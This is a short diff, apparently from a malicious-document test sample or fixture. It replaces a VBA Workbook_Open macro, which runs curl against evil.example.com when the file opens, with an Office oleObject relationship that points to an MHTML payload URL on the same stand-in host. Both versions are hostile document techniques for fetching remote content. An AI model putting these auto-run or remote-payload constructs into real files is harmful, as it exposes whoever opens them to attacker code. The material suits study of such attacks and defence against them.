@@ -1,3 +1,1 @@
-Private Sub Workbook_Open()
-  CreateObject("WScript.Shell").Run "curl http://evil.example.com/"
-End Sub
+<Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="mhtml:http://evil.example.com/payload!x.html"/>
